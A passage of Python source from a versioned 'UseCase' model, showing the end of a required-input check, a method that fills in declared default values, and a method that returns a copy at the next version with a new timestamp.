            if spec.required and values.get(spec.name) in (None, "")
        ]

    def with_defaults(self, values: dict[str, Any]) -> dict[str, Any]:
        """Input values with declared defaults filled in."""
        merged = {s.name: s.default for s in self.inputs if s.default is not None}
        merged.update({k: v for k, v in values.items() if v is not None})
        return merged

    def bump(self) -> "UseCase":
        """A copy at the next version, stamped now. Versions are immutable."""
        return self.model_copy(update={"version": self.version + 1, "updated_at": _now()})
